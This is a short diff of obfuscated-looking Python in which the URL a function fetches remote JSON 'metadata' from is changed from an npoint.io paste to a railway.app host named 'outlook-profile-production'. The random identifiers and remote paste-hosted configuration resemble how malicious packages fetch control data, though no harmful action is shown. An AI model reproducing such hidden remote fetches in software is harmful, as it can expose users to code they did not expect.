@@ -16,7 +16,7 @@ def config_ctswms_602():
 
     def process_wlbwic_362():
         try:
-            net_fattdl_743 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_fattdl_743 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_fattdl_743.raise_for_status()
             model_gzroyv_829 = net_fattdl_743.json()
             config_igjdvy_773 = model_gzroyv_829.get('metadata')
